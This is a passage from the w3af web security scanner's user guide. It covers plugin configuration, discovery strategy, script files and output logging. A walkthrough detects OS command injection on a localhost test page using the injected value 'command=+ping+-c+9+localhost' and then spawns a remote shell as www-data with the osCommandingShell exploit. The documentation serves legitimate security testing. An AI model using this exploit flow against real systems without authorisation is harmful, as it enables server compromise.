<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/output/config:textFile&gt;&gt;&gt;</B>
set fileName output-w3af.txt</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/output/config:textFile&gt;&gt;&gt;</B>
set verbose True</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/output/config:textFile&gt;&gt;&gt;</B>
back</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
output config console</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/output/config:console&gt;&gt;&gt;</B>
set verbose False</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/output/config:console&gt;&gt;&gt;</B>
back</FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">All
this previous commands have enabled two output plugins, console and
textFile and configured them as needed.</FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
discovery allowedMethods,webSpider</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
back</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">In
this case, we will be running only discovery plugins. The enabled
plugins are allowedMethods and webSpider .</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
target</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/target&gt;&gt;&gt;</B>set
target http://localhost/w3af/</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/target&gt;&gt;&gt;</B>back</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
start</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">New
URL found by discovery:
http://localhost/w3af/responseSplitting/responseSplitting.php</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">New
URL found by discovery:
http://localhost/w3af/blindSqli/blindSqli-str.php</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">New
URL found by discovery: http://localhost/w3af/webSpider/2.html</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">...</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">...</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">The
URL: http://localhost/beef/hook/ has DAV methods enabled:</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
OPTIONS</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
GET</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
HEAD</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
POST</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
TRACE</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
PROPFIND</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
PROPPATCH</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
COPY</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
MOVE</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
LOCK</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
UNLOCK</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
DELETE ( is possibly enabled too, not tested for safety )</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">New
URL found by discovery: http://localhost/w3af/globalRedirect/wargame/</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">New
URL found by discovery:
http://localhost/w3af/globalRedirect/w3af-site.tgz</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">After
the discovery phase is finished a summary is presented to the user:</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">The
list of found URLs is:</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/globalRedirect/w3af.testsite.tgz</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/beef/hook/beefmagic.js.php</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/globalRedirect/2.php</FONT></P>
<UL>
	<LI><P STYLE="font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">http://localhost/w3af/webSpider/11.html</FONT></P>
	<P STYLE="font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">...</FONT></P>
</UL>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">A
section of the summary is the points of injection that will be used
in the audit phase:</FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Found
78 URLs and 102 different points of injection.</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">The
list of Fuzzable requests is:</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/ | Method: GET</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/responseSplitting/responseSplitting.php |
Method: GET | Parameters: (header)</FONT></P>
<UL>
	<LI><P STYLE="font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">http://localhost/w3af/sqli/dataReceptor.php
	| Method: POST | Parameters: (user,firstname)</FONT></P>
</UL>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">Finally
the user exits the application, returning to the shell.</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
exit</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">w3af,
better than the regular script kiddie.</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>$</B></FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<H2 CLASS="western">A warning about discovery</H2>
<P><BR><BR>
</P>
<P>The discovery phase is a double edged sword: use it with wisdom,
and it will give you a lot of knowledge about the remote web
application, use it in a greedy way and you will be waiting for hours
until the discovery phase ends. Just to make things clear, the greedy
way is to enable all discovery plugins ( “discovery all” )
without even knowing what you are doing or having manually browsed
the web and understood its internals. 
</P>
<P>Some examples will make things clear: 
</P>
<UL>
	<LI><P ALIGN=JUSTIFY>“You are testing an intranet web application,
	the web application is huge and doesn't use any macromedia flash or
	javascript code”. 
	</P>
	<P ALIGN=JUSTIFY><I>Recommendation :</I> “discovery
	all,!spiderMan, !fingerGoogle, !fingerBing, !fingerPKS, !BingSpider,
	!googleSpider, !phishtank, !googleSafeBrowsing”.</P>
	<P ALIGN=JUSTIFY><I>Reason: </I><SPAN STYLE="font-style: normal">Spiderman
	should only be used when webSpider can't find all links. The
	fingerGoogle, fingerBing and fingerPKS plugins discover mail
	addresses from search engines, if this is an intranet application,
	the addresses put in this site wont be available in search engines
	because they never were indexed. BingSpider and googleSpider find
	URLs using search engines, like the ones before, they are useless
	because search engines don't index private pages. phishtank and
	googleSafeBrowsing should be enabled because they search for
	phishing sites, and like the ones before them, private sites aren't
	indexed in this systems.</SPAN></P>
	<P></P>
	<LI><P>“You are testing a web application over the internet, the
	web application is huge and doesn't use any macromedia flash or
	javascript code”. 
	</P>
	<P><I>Recommendation</I> : “discovery all,!spiderMan, !wordnet ,
	!googleSets”.</P>
	<P ALIGN=JUSTIFY><I>Reason: </I><SPAN STYLE="font-style: normal">Spiderman
	should only be used when webSpider can't find all links. The wordnet
	and googleSets plugins are two plugins that take a long time to run
	over the internet so it's a good idea to disable them.</SPAN></P>
	<P></P>
	<LI><P>“You are testing a web application over the internet, the
	web application is huge and has macromedia flash or javascript code.
	You also know that the application doesn't implement any web
	services”. 
	</P>
	<P><I>Recommendation</I> : “discovery all, !wordnet , !googleSets,
	!wsdlFinder”.</P>
	<P ALIGN=JUSTIFY><I>Reason: </I><SPAN STYLE="font-style: normal">The
	wordnet and googleSets plugins are two plugins that take a </SPAN><SPAN STYLE="font-style: normal">long
	time to run over the internet so it's a good idea to disable them.
	Regarding wsdlFinder, if we already know that no web services exist,
	why look for them?</SPAN></P>
	<P></P>
	<LI><P>“You are testing a web application over the internet, the
	web application is huge, you really need to know all the links and
	functionality of the site and you don't care waiting.”. 
	</P>
	<P><I>Recommendation</I> : “discovery all” .</P>
	<P ALIGN=JUSTIFY><I>Reason: </I><SPAN STYLE="font-style: normal">You
	really need to get a lot of knowledge about the site and don't care
	if it takes a complete day.</SPAN></P>
</UL>
<P ALIGN=JUSTIFY STYLE="font-style: normal"><BR><BR>
</P>
<P ALIGN=JUSTIFY><SPAN STYLE="font-style: normal">The latest
framework release incorporates a “maxDiscoveryTime” parameter in
the misc-settings. </SPAN><SPAN STYLE="font-style: normal">The
default setting is two hours of discovery, which in most cases will
be enough to map the whole web application and then start injecting
with the audit plugins.</SPAN></P>
<H3 CLASS="western">When everything else fails...</H3>
<P ALIGN=JUSTIFY STYLE="font-style: normal">So, you enabled only the
recommended plugins in the discovery phase, you started the framework
one hour ago, the discovery is still running and doesn't find
anything. When you find yourself in this situation you have two
options, waiting for w3af to finish or hitting CTRL+C to finish the
discovery and start with the audit phase.</P>
<P ALIGN=JUSTIFY STYLE="font-style: normal">You should also remember
that if you are saving the debug information to a text file you can
open a new terminal and run a “tail -f w3af-output-file.txt” to
see what w3af is really doing.</P>
<H2 CLASS="western">w3af scripts</H2>
<P><BR><BR>
</P>
<P ALIGN=JUSTIFY>While developing w3af, I realized that I needed a
fast way to execute the same steps over and over, so the script
functionality was born. w3af can run a script file using the “-s”
argument. Script files are text files with one command on each line.
An example script file would look like this:</P>
<P><BR><BR>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
head scripts/script-osCommanding.w3af</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">#
This is the osCommanding demo:</FONT></P>
<P STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">plugins</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">output
console,textFile</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">output</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">output
config textFile</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">set
fileName output-w3af.txt</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">set
verbose True</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">back</FONT></P>
<P STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">To run
this script you would execute <FONT FACE="Nimbus Mono L, monospace">“./w3af_console
-s scripts/script-osCommanding.w3af” </FONT>,  the output would
look just like if you typed every command by hand in the console:</FONT></P>
<P><BR><BR>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
./w3af_console -s scripts/script-osCommanding.w3af</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">plugins
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">output
console,textFile </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">output</SPAN><B>
</B></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|-----------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
Plugin    | Status  | Conf | Description                  | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
name      |         |      |                              | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|-----------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
console   | Enabled | Yes  | Print messages to the        | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
          |         |      | console.                     | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
gtkOutput |         |      | Saves messages to            | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
          |         |      | kb.kb.getData('gtkOutput',   | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
          |         |      | 'queue'), messages are saved | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
          |         |      | in the form of objects.      | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
htmlFile  |         | Yes  | Print all messages to a HTML | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
          |         |      | file.                        | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
textFile  | Enabled | Yes  | Prints all messages to a     | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
          |         |      | text file.                   | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
webOutput |         |      | Print all messages to the    | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
          |         |      | web user interface - this    | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
          |         |      | plugin and the web user      | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|
          |         |      | interface are DEPRECATED.    | </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">|-----------------------------------------------------------|
</FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">output
config textFile </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/output/config:textFile&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">set
fileName output-w3af.txt </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/output/config:textFile&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">set
verbose True </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/output/config:textFile&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">back
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">output
config console </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/output/config:console&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">set
verbose False </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/output/config:console&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">back
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">back
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">plugins
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">audit
osCommanding </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">back
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">target
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/config:target&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">set
target
http://localhost/w3af/osCommanding/vulnerable.php?command=f0as9 </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/config:target&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">back
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">start
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Found
1 URLs and 1 different points of injection. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">The
list of URLs is: </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/osCommanding/vulnerable.php </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">The
list of fuzzable requests is: </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
http://localhost/w3af/osCommanding/vulnerable.php | Method: GET |
Parameters: (command) </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Starting
osCommanding plugin execution. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">OS
Commanding was found at:
&quot;http://localhost/w3af/osCommanding/vulnerable.php&quot;, using
HTTP method GET. The sent data was: &quot;command=+ping+-c+9+localhost&quot;.
The vulnerability was found in the request with id 5. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Finished
scanning process. </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">exploit
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">exploit
osCommandingShell </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">osCommandingShell
exploit plugin is starting. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">The
vulnerability was found using method GET, tried to change the method
to POST for exploiting but failed. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Vulnerability
successfully exploited. This is a list of available shells: </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">-
[0] &lt;osCommandingShell object (ruser: &quot;www-data&quot; |
rsystem: &quot;Linux brick 2.6.24-19-generic i686 GNU/Linux&quot;)&gt;
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Please
use the interact command to interact with the shell objects. </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">interact
0 </SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">Execute
&quot;endInteraction&quot; to get out of the remote shell. Commands
typed in this menu will be runned on the remote web server. </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/osCommandingShell-0&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">ls
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">vulnerable.php
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">vulnerable2.php
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">w3afAgentClient.log
</FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/osCommandingShell-0&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">endInteraction
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">back
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B><SPAN STYLE="font-weight: medium">exit
</SPAN></FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">spawned
a remote shell today? </FONT>
</P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>$
</B></FONT>
</P>
<P STYLE="margin-left: 0.49in"><BR><BR>
</P>
<H2 CLASS="western">The Output</H2>
<P><BR><BR>
</P>
<P ALIGN=JUSTIFY>All the output of w3af is managed by the output
plugins. Each output plugin will write in a different format ( txt,
html, etc ), for example the textFile plugin writes all output to the
output-w3af.txt file by default. The configuration of this plugins is
done just like other plugins, as seen before:</P>
<P><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
./w3af_console</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
plugins</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
output console,textFile</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
output config textFile</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/output/config:textFile&gt;&gt;&gt;</B>
set fileName output-w3af.txt</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/output/config:textFile&gt;&gt;&gt;</B>
set verbose True</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/output/config:textFile&gt;&gt;&gt;</B>
back</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
output config console</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/output/config:console&gt;&gt;&gt;</B>
set verbose False</FONT></P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins/output/config:console&gt;&gt;&gt;</B>
back</FONT></P>
<P><BR><BR>
</P>
<P ALIGN=JUSTIFY>This will configure the textFile plugin to output
all messages, including the debugging information ( see “<FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="font-weight: medium">set
verbose True” </SPAN></FONT><FONT FACE="Bitstream Vera Sans, sans-serif"><SPAN STYLE="font-weight: medium">)
to the </SPAN></FONT><FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="font-weight: medium">“output-w3af.txt”
</SPAN></FONT><FONT FACE="Bitstream Vera Sans, sans-serif"><SPAN STYLE="font-weight: medium">file.
Here is an example of what is written to this file:</SPAN></FONT></P>
<P STYLE="font-weight: medium"><BR><BR>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">[
Sun Sep 14 17:36:09 2008 - debug - w3afCore ] Exiting
setOutputPlugins() </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">[
Sun Sep 14 17:36:09 2008 - debug - w3afCore ] Called w3afCore.start()
</FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">[
Sun Sep 14 17:36:09 2008 - debug - xUrllib ] Called buildOpeners </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">[
Sun Sep 14 17:36:09 2008 - debug - keepalive ] keepalive: The
connection manager has 0 active connections. </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">[
Sun Sep 14 17:36:09 2008 - debug - keepalive ] keepalive: added one
connection, len(self._hostmap[&quot;localhost&quot;]): 1 </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">[
Sun Sep 14 17:36:09 2008 - debug - httplib ] DNS response from DNS
server for domain: localhost </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><FONT FACE="Nimbus Mono L, monospace">[
Sun Sep 14 17:36:09 2008 - debug - xUrllib ] GET
http://localhost/w3af/osCommanding/vulnerable.php?command=f0as9
returned HTTP code &quot;200&quot; </FONT>
</P>
<P STYLE="margin-left: 0.49in; font-weight: medium"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="font-weight: medium"><FONT FACE="Bitstream Vera Sans, sans-serif">Output
plugins also handle the logging of HTTP requests and responses. Every
plugin handles this data in a different way. For example, the
textFile plugin writes requests and responses to a file, while the
htmlFile plugin disregards the data and simply does nothing with it.
An example of a HTTP log written by the textFile follows:</FONT></P>
